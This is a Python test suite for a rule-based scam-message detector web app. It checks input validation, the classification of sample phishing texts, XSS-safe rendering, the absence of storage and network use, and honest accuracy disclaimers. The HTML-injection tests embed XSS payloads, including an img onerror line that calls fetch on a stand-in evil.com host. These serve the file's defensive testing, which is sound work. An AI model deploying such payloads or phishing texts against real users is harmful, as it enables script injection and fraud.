"""
tests/test_security_review.py
------------------------------
Quality and security review for ScamShield AI.
Maps to the 10-point review checklist.

Covers items that can be verified programmatically:
  3. Valid and invalid form submissions
  4. Sample message classifications
  5. Warning-sign explanations
  6. HTML injection and safe rendering
  7. Empty and long inputs
  8. Missing model files (no ML model present — graceful handling)
  9. Message storage / external transmission
 10. Accuracy reporting

Items 1 (installation from docs), 2 (browser UI startup), and visual
screenshot guidance are NOT TESTED here — they require manual steps.
"""

import sys
import os
import re
import ast
import importlib
import json
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

import app as flask_app
from detector.engine import analyze

flask_app.app.testing = True
CLIENT = flask_app.app.test_client()


def post(msg):
    resp = CLIENT.post(
        "/analyze",
        data=json.dumps({"message": msg}),
        content_type="application/json",
    )
    return resp.status_code, resp.get_json()


# ─────────────────────────────────────────────────────────────────
# CHECK 3 — Valid and invalid form submissions
# ─────────────────────────────────────────────────────────────────

class Check3FormSubmissions(unittest.TestCase):

    def test_valid_submission_returns_200(self):
        status, data = post("Your appointment is confirmed for Monday.")
        self.assertEqual(status, 200)
        self.assertIn("verdict", data)

    def test_missing_message_key_returns_400(self):
        resp = CLIENT.post("/analyze", json={"text": "hello"})
        self.assertEqual(resp.status_code, 400)
        self.assertIn("error", resp.get_json())

    def test_non_json_body_returns_400(self):
        resp = CLIENT.post(
            "/analyze",
            data="not json at all",
            content_type="text/plain",
        )
        self.assertEqual(resp.status_code, 400)

    def test_empty_message_returns_400(self):
        status, data = post("")
        self.assertEqual(status, 400)
        self.assertIn("error", data)

    def test_whitespace_only_returns_400(self):
        status, data = post("    \n\t  ")
        self.assertEqual(status, 400)

    def test_message_too_long_returns_400(self):
        status, data = post("x" * 25_000)
        self.assertEqual(status, 400)
        self.assertIn("error", data)

    def test_valid_scam_returns_structured_response(self):
        status, data = post("URGENT verify your password now!")
        self.assertEqual(status, 200)
        for key in ("verdict", "score", "confidence", "signals",
                    "css_class", "icon", "subtitle", "explanation", "warnings"):
            self.assertIn(key, data)


# ─────────────────────────────────────────────────────────────────
# CHECK 4 — Sample message classifications
# ─────────────────────────────────────────────────────────────────

class Check4SampleClassifications(unittest.TestCase):

    def test_phishing_sample_verdict(self):
        msg = (
            "URGENT: Your Netflix account has been suspended due to a billing failure.\n"
            "Verify your payment details immediately:\n"
            "https://netflix-secure-update.xyz/verify\n"
            "Act now. This link expires in 24 hours."
        )
        status, data = post(msg)
        self.assertEqual(status, 200)
        self.assertEqual(data["verdict"], "Likely Spam/Scam")
        self.assertGreaterEqual(data["score"], 60)

    def test_prize_spam_verdict(self):
        msg = (
            "Congratulations! You have been SELECTED for a FREE $500 Amazon Gift Card!\n"
            "Claim at http://bit.ly/claim-free-gift  Don't miss out!!!"
        )
        status, data = post(msg)
        self.assertEqual(status, 200)
        self.assertGreaterEqual(data["score"], 30)

    def test_otp_scam_verdict(self):
        msg = (
            "ALERT: Unusual sign-in detected. Enter your one-time passcode and password at:\n"
            "http://192.0.2.45/bank-secure-login\n"
            "Your account will be locked in 30 minutes."
        )
        status, data = post(msg)
        # Credential (25) + IP URL (22) + threat (20) = 67 with cap → Scam or Suspicious
        self.assertIn(data["verdict"], ["Suspicious — needs review", "Likely Spam/Scam"])
        self.assertGreaterEqual(data["score"], 35)

    def test_payment_fraud_verdict(self):
        msg = (
            "Final Notice: unpaid invoice. Legal action and arrest warrant in 24 hours.\n"
            "Pay now via wire transfer or Bitcoin to avoid prosecution."
        )
        status, data = post(msg)
        # Threat (20) + payment demand (20) = 40 → Suspicious at minimum
        self.assertIn(data["verdict"], ["Suspicious — needs review", "Likely Spam/Scam"])
        self.assertGreaterEqual(data["score"], 35)

    def test_legitimate_appointment_verdict(self):
        msg = (
            "Hi Sarah, your dental appointment is scheduled for Tuesday at 10:30 AM.\n"
            "Call (555) 234-5678 to reschedule. Kind regards, SmileCare Dental."
        )
        status, data = post(msg)
        self.assertEqual(data["verdict"], "Likely Legitimate")
        self.assertLess(data["score"], 30)

    def test_legitimate_delivery_verdict(self):
        msg = (
            "Your Amazon order #112-3456789 has shipped. "
            "Estimated delivery: Thursday. Track at amazon.com/orders."
        )
        status, data = post(msg)
        self.assertNotEqual(data["verdict"], "Likely Spam/Scam")

    def test_verdict_one_of_three_values(self):
        valid = {"Likely Legitimate", "Suspicious — needs review", "Likely Spam/Scam"}
        for msg in [
            "Hello there",
            "Your account may need attention",
            "URGENT click now http://bit.ly/x",
        ]:
            _, data = post(msg)
            self.assertIn(data["verdict"], valid)


# ─────────────────────────────────────────────────────────────────
# CHECK 5 — Warning sign explanations
# ─────────────────────────────────────────────────────────────────

class Check5WarningExplanations(unittest.TestCase):

    def test_warnings_have_rule_description_excerpt(self):
        _, data = post(
            "URGENT verify your password now at https://paypal-secure.xyz"
        )
        self.assertGreater(len(data["warnings"]), 0)
        for w in data["warnings"]:
            self.assertIn("rule", w)
            self.assertIn("description", w)
            self.assertIn("excerpt", w)
            self.assertTrue(len(w["rule"]) > 0)
            self.assertTrue(len(w["description"]) > 10)
            self.assertTrue(len(w["excerpt"]) > 0)

    def test_no_warnings_for_clean_message(self):
        _, data = post("See you at the meeting tomorrow at 10am.")
        self.assertEqual(data["signals"], len(data["warnings"]))

    def test_explanation_contains_signal_count(self):
        _, data = post("URGENT verify password at bit.ly/x NOW!")
        n = len(data["warnings"])
        # Explanation should mention the count or "no significant"
        self.assertIsInstance(data["explanation"], str)
        self.assertGreater(len(data["explanation"]), 20)

    def test_explanation_contains_disclaimer(self):
        """Engine always appends 'not a guarantee' / 'official channels'."""
        for msg in [
            "Hello",
            "URGENT verify your password at https://paypal-secure.xyz now",
        ]:
            _, data = post(msg)
            text = data["explanation"].lower()
            self.assertTrue(
                "official" in text or "automated" in text or "pattern" in text,
                msg=f"No disclaimer found in: {data['explanation'][:80]}"
            )

    def test_legit_explanation_has_no_signals(self):
        _, data = post("Hi, hope you are well. Lunch on Friday?")
        self.assertIn("no significant", data["explanation"].lower())


# ─────────────────────────────────────────────────────────────────
# CHECK 6 — HTML injection and safe rendering
# ─────────────────────────────────────────────────────────────────

class Check6HtmlInjection(unittest.TestCase):

    def test_script_tag_in_message_does_not_execute(self):
        """
        The API returns JSON. The frontend renders via textContent only.
        Server-side: Jinja2 auto-escapes template variables.
        This test confirms the JSON payload itself is not processed as HTML.
        """
        # "urgent action" fires; "verify password" alone no longer does (requires "enter your...")
        msg = "<script>alert('xss')</script> Urgent action required: enter your password now"
        status, data = post(msg)
        self.assertEqual(status, 200)
        # Engine detects urgent action + enter your password
        self.assertGreater(data["score"], 0)
        # JSON response is plain text — no HTML encoding needed at transport level
        raw = json.dumps(data)
        # The script tag may appear literally in JSON (that is correct and safe —
        # it is the frontend's job not to use innerHTML with it, which we verify
        # via the template structure test)
        self.assertIsInstance(raw, str)

    def test_img_onerror_payload_not_executed(self):
        # Use explicit "enter your password" phrasing that the tightened rules catch
        msg = '<img src=x onerror="fetch(\'http://evil.com\')"> please enter your password here'
        status, data = post(msg)
        self.assertEqual(status, 200)
        # credential-harvesting rule catches "enter your password"
        rule_names = [w["rule"] for w in data["warnings"]]
        self.assertTrue(any("Credential" in r or "credential" in r.lower() for r in rule_names))

    def test_explanation_never_contains_raw_user_text(self):
        """Explanation is built by the engine from rule names, not from message text."""
        msg = "<b>INJECTED_MARKER</b> urgent verify password"
        _, data = post(msg)
        self.assertNotIn("INJECTED_MARKER", data["explanation"])
        self.assertNotIn("<b>", data["explanation"])

    def test_frontend_uses_textcontent_not_innerhtml_for_user_data(self):
        """
        Verify the template never writes server-returned dynamic data via innerHTML.
        All four innerHTML uses in index.html must be static string literals.
        """
        with open("templates/index.html", encoding="utf-8") as f:
            html = f.read()

        # Find all innerHTML assignments
        inner_html_lines = [
            line.strip() for line in html.splitlines()
            if "innerHTML" in line and "=" in line
        ]

        # Each must be assigning a static literal — not a variable from r.*
        forbidden_patterns = [
            r"\.innerHTML\s*=\s*\w+\.",   # e.g.  el.innerHTML = r.something
            r"\.innerHTML\s*\+=",          # concatenation onto innerHTML
        ]
        for pattern in forbidden_patterns:
            for line in inner_html_lines:
                self.assertIsNone(
                    re.search(pattern, line),
                    msg=f"Potentially unsafe innerHTML found: {line}"
                )

    def test_jinja2_autoescape_is_active(self):
        """Flask enables Jinja2 autoescape for .html templates by default."""
        import flask
        from jinja2 import Environment
        # Flask creates its Jinja env with autoescape=True for html/xml/svg
        env = flask_app.app.jinja_env
        # Check autoescape is a callable or True
        self.assertTrue(
            env.autoescape is True or callable(env.autoescape),
            "Jinja2 autoescape is not enabled"
        )


# ─────────────────────────────────────────────────────────────────
# CHECK 7 — Empty and unusually long inputs
# ─────────────────────────────────────────────────────────────────

class Check7EdgeInputs(unittest.TestCase):

    def test_empty_string_rejected_at_route(self):
        status, data = post("")
        self.assertEqual(status, 400)

    def test_whitespace_string_rejected(self):
        status, _ = post("\n\n   \t\t")
        self.assertEqual(status, 400)

    def test_single_character_accepted(self):
        status, data = post("a")
        self.assertEqual(status, 200)

    def test_exactly_max_length_accepted(self):
        status, data = post("a" * 20_000)
        self.assertEqual(status, 200)

    def test_one_over_max_length_rejected(self):
        status, data = post("a" * 20_001)
        self.assertEqual(status, 400)

    def test_very_long_rejected_with_error_key(self):
        status, data = post("z" * 50_000)
        self.assertEqual(status, 400)
        self.assertIn("error", data)

    def test_engine_truncates_silently(self):
        """Engine itself truncates at MAX_MESSAGE_LENGTH — no crash."""
        result = analyze("A" * 25_000)
        self.assertIn("verdict", result)

    def test_unicode_heavy_input(self):
        status, data = post("🎉🎁🏆 " * 100 + " Congratulations you won!")
        self.assertEqual(status, 200)

    def test_null_bytes_in_message(self):
        status, data = post("urgent\x00verify password\x00now")
        self.assertEqual(status, 200)


# ─────────────────────────────────────────────────────────────────
# CHECK 8 — Missing model files / graceful degradation
# ─────────────────────────────────────────────────────────────────

class Check8MissingModel(unittest.TestCase):

    def test_no_ml_model_file_present(self):
        """No serialised model should exist — Phase 4 was not completed."""
        import glob as g
        model_files = (
            g.glob("*.joblib") + g.glob("*.pkl") +
            g.glob("detector/*.joblib") + g.glob("detector/*.pkl") +
            g.glob("models/*.joblib") + g.glob("models/*.pkl")
        )
        # If a model existed but the import failed, the app should still work
        self.assertEqual(model_files, [],
            msg=f"Unexpected model files found: {model_files}")

    def test_app_works_without_ml_packages_being_imported(self):
        """app.py and detector/ must not import scikit-learn at startup."""
        import importlib, sys

        # Temporarily hide sklearn from sys.modules to simulate it being absent
        hidden = {}
        for key in list(sys.modules.keys()):
            if key.startswith("sklearn"):
                hidden[key] = sys.modules.pop(key)

        try:
            # Re-importing the detector should not raise ImportError
            import importlib
            import detector.engine as eng
            importlib.reload(eng)
            result = eng.analyze("test message")
            self.assertIn("verdict", result)
        finally:
            # Restore
            sys.modules.update(hidden)

    def test_analyze_route_works_without_sklearn(self):
        status, data = post("Check this link http://bit.ly/test urgently")
        self.assertEqual(status, 200)
        self.assertIn("verdict", data)


# ─────────────────────────────────────────────────────────────────
# CHECK 9 — Message storage and external transmission
# ─────────────────────────────────────────────────────────────────

class Check9NoStorageOrTransmission(unittest.TestCase):

    def test_app_has_no_database_import(self):
        with open("app.py", encoding="utf-8") as f:
            src = f.read()
        for forbidden in ("sqlite3", "sqlalchemy", "pymysql", "psycopg2",
                          "flask_sqlalchemy", "peewee", "motor", "pymongo"):
            self.assertNotIn(forbidden, src,
                msg=f"Database library '{forbidden}' found in app.py")

    def test_engine_has_no_network_import(self):
        """Check that no network library is *imported*, not just mentioned in comments."""
        import ast
        for fname in ("detector/engine.py", "detector/rules.py"):
            with open(fname, encoding="utf-8") as f:
                src = f.read()
            tree = ast.parse(src)
            imported_names = set()
            for node in ast.walk(tree):
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        imported_names.add(alias.name.split(".")[0])
                elif isinstance(node, ast.ImportFrom):
                    if node.module:
                        imported_names.add(node.module.split(".")[0])
            for forbidden in ("requests", "urllib", "http", "socket", "aiohttp", "httpx"):
                self.assertNotIn(forbidden, imported_names,
                    msg=f"Network library '{forbidden}' is imported in {fname}")

    def test_no_session_or_global_message_store(self):
        with open("app.py", encoding="utf-8") as f:
            src = f.read()
        # No session, no global list/dict accumulating messages
        self.assertNotIn("session[", src)
        self.assertNotIn("messages.append", src)
        self.assertNotIn("message_log", src)

    def test_analyze_route_is_stateless(self):
        """
        Call /analyze twice with different messages — neither result should
        contain any data from the other call.
        """
        _, d1 = post("URGENT verify password now at https://paypal-secure.xyz")
        _, d2 = post("Hi, your appointment is confirmed for Monday.")

        # Results must differ
        self.assertNotEqual(d1["verdict"], d2["verdict"])
        # Warnings from call 1 must not bleed into call 2
        excerpts_d2 = [w["excerpt"] for w in d2["warnings"]]
        self.assertNotIn("password", " ".join(excerpts_d2))

    def test_no_logging_of_message_content(self):
        """app.py must not log the message string itself."""
        with open("app.py", encoding="utf-8") as f:
            src = f.read()
        # Check no logger.info/debug/warning/error with the message variable
        self.assertNotIn('log.info(message', src)
        self.assertNotIn('logging.info(message', src)
        self.assertNotIn('print(message', src)


# ─────────────────────────────────────────────────────────────────
# CHECK 10 — Accuracy reporting
# ─────────────────────────────────────────────────────────────────

class Check10AccuracyReporting(unittest.TestCase):

    def test_homepage_has_no_accuracy_percentage(self):
        resp = CLIENT.get("/")
        html = resp.data.decode()
        # No accuracy claims like "98% accurate" or "95% precision"
        self.assertIsNone(
            re.search(r"\d+\s*%\s*(accura|precision|recall|f1)", html, re.IGNORECASE),
            "Homepage contains a fabricated accuracy percentage"
        )

    def test_homepage_does_not_claim_machine_learning(self):
        resp = CLIENT.get("/")
        html = resp.data.decode()
        # The page may say "not a trained AI model" (a disclaimer) — that is correct.
        # What is forbidden is a *positive* claim: "uses a trained model", etc.
        forbidden_positive = [
            "uses a trained",
            "trained on",
            "machine learning model",
            "neural network",
            "deep learning",
            "our AI model analyses",
        ]
        for phrase in forbidden_positive:
            self.assertNotIn(phrase.lower(), html.lower(),
                msg=f"Homepage makes a positive ML capability claim: '{phrase}'")
        # Confirm the disclaimer IS present
        self.assertIn("not a trained", html.lower(),
            msg="Expected disclaimer 'not a trained AI model' is missing")

    def test_no_ml_model_in_codebase(self):
        """Phase 4 was not completed — no trained model should exist in project root."""
        import glob as g
        # Only check project-level model files; exclude venv/ and .venv/
        model_files = [
            p for p in
            g.glob("**/*.joblib", recursive=True) + g.glob("**/*.pkl", recursive=True)
            if not p.startswith(("venv", ".venv"))
        ]
        self.assertEqual(model_files, [],
            msg=f"Unexpected model files found outside venv: {model_files}")

    def test_disclaimer_is_present_on_results(self):
        """Assessment notice must tell users results are pattern-matching only."""
        resp = CLIENT.get("/")
        html = resp.data.decode()
        self.assertIn("pattern-matching rules", html)
        self.assertIn("Automated Assessment", html)


if __name__ == "__main__":
    unittest.main(verbosity=2)
